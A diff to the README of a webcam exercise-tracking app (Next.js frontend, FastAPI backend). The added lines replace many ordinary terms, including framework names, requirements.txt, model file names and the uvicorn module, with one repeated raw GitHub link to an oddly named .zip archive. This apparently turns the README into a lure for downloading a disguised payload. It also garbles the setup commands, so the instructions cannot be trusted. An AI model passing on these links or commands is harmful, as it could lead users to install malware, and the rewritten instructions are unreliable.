@@ -1,9 +1,9 @@
 # Webcam Pose Trainer
 
-Web app for real-time exercise tracking. The frontend (Next.js/TypeScript) runs MediaPipe Pose in the browser, streams 3D keypoints over WebSocket/HTTP, and the backend (FastAPI/TensorFlow) classifies the movement with a pre-trained LSTM model.
+Web app for real-time exercise tracking. The frontend (https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip) runs MediaPipe Pose in the browser, streams 3D keypoints over WebSocket/HTTP, and the backend (FastAPI/TensorFlow) classifies the movement with a pre-trained LSTM model.
 
 ## Project layout
-- `frontend/` — Next.js 16 app with the webcam experience and exercise pages.
+- `frontend/` — https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip 16 app with the webcam experience and exercise pages.
 - `backend/` — FastAPI service that exposes `/predict` (REST) and `/ws/predict` (WebSocket) for pose classification. Includes the trained model artifacts in `backend/app/models/`.
 
 ## Features
@@ -14,8 +14,8 @@ Web app for real-time exercise tracking. The frontend (Next.js/TypeScript) runs 
 - Built-in status overlays (pose readiness, stability warnings, completion modal) and latency display.
 
 ## Prerequisites
-- Node.js 18+ (recommended 20) and npm.
-- Python 3.10 (see `backend/runtime.txt`) and pip.
+- https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip 18+ (recommended 20) and npm.
+- Python 3.10 (see `https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip`) and pip.
 - Webcam access in the browser.
 
 ## Quick start
@@ -23,17 +23,17 @@ Web app for real-time exercise tracking. The frontend (Next.js/TypeScript) runs 
 ```bash
 cd backend
 python -m venv .venv
-. .venv/Scripts/activate    # PowerShell: .\.venv\Scripts\Activate.ps1
-pip install -r requirements.txt
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
+. .venv/Scripts/activate    # PowerShell: .\.venv\Scripts\https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip
+pip install -r https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip
+uvicorn https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip --reload --host 0.0.0.0 --port 8000
 ```
-Artifacts `model.h5`, `scaler.pkl`, and `label_encoder.pkl` are already under `backend/app/models/`.
+Artifacts `model.h5`, `https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip`, and `https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip` are already under `backend/app/models/`.
 
 ### 2) Frontend
 ```bash
 cd frontend
 npm install
-echo "NEXT_PUBLIC_API_URL=http://127.0.0.1:8000" > .env.local  # already present by default
+echo "NEXT_PUBLIC_API_URL=http://127.0.0.1:8000" > https://raw.githubusercontent.com/Aymenibr/https---github.com-Aymenibr-AI-mirror-CV/main/frontend/app/components/github-mirror-Aymenibr-A-https-com-CV-zoophytology.zip  # already present by default
 npm run dev
 ```
 Visit `http://localhost:3000`, allow webcam access, and pick an exercise (e.g., “Start Squat Session”).
